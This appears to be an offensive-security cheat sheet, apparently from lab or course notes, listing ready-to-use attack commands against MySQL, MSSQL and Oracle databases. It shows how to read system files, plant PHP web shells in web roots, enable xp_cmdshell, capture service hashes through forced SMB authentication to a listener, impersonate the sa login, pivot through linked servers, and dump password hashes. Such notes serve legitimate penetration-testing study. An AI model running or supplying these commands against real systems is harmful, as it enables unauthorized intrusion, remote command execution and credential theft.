# 03. Database Services
## MYSQL
### Read Files
```mysql
select LOAD_FILE("/etc/passwd");
```

### Write Files
```mysql
show variables like "secure_file_priv";

SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

## 🗄️ MSSQL (Microsoft SQL Server)

**포트**: 1433

### 기본 데이터베이스
```mssql
1> SELECT name FROM master.dbo.sysdatabases
2> GO

1> USE htbusers
2> GO

1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

1> SELECT * FROM users
2> go
```

MSSQL 설치 시 기본으로 생성되는 데이터베이스:

| 데이터베이스 | 용도 |
|-------------|------|
| `master` | 시스템 설정 및 메타데이터 |
| `model` | 새 데이터베이스의 템플릿 |
| `msdb` | SQL Server Agent, 백업, 작업 정보 |
| `tempdb` | 임시 데이터 저장 |
| `resource` | 시스템 객체 (숨김) |

### xp_cmdshell
```mssql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO

xp_cmdshell 'whoami'
GO
```
### Read Files
```mssql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

### Write Files
```mssql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Capture MSSQL Service Hash
```bash
sudo responder -I tun0 -v

sudo impacket-smbserver share ./ -smb2support
```
```mssql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

### Impersonate Existing Users with MSSQL
```mssql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

### Communicate with Other Databases with MSSQL
```mssql
1> SELECT srvname, isremote FROM sysservers
2> GO

1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```
---

## 🏛️ Oracle TNS (Transparent Network Substrate)

**포트**: 1521

### ODAT 도구 사용

```bash
# 모든 Oracle 취약점 테스트
sudo odat.py all -s 10.129.204.235

# Oracle Instant Client 라이브러리 설정
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
sudo ldconfig
```

### SQLPlus 연결

```bash
# 일반 사용자로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid>

# SYSDBA 권한으로 연결
sqlplus scott/tiger@10.129.204.235/<oracle_sid> as sysdba
```

### 파일 업로드 (웹쉘)

```bash
# utlfile을 이용한 파일 업로드
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### 유용한 SQL 쿼리

```sql
-- 모든 테이블 조회
SELECT table_name FROM all_tables;

-- 현재 사용자의 권한 확인
SELECT * FROM user_role_privs;

-- 사용자 계정 및 해시 조회
SELECT name, password FROM sys.user$;
```
